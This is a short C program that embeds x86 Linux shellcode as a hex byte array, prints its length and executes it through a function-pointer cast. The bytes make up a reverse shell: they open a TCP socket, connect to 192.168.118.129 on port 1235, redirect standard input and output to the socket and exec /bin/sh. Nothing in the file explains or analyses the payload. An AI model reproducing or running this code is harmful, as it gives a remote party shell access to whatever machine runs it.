#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\x31\xdb\x31\xc9\xb3\x01\x50\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x89\xc6\x5b\x31\xd2\x68\xc0\xa8\x76\x81\x66\x68\x04\xd3\x66\x53\x89\xe1\x6a\x10\x51\x56\x43\x89\xe1\xb0\x66\xcd\x80\x31\xc9\xb1\x02\x89\xf3\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xca\xb0\x0b\xcd\x80";

main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}
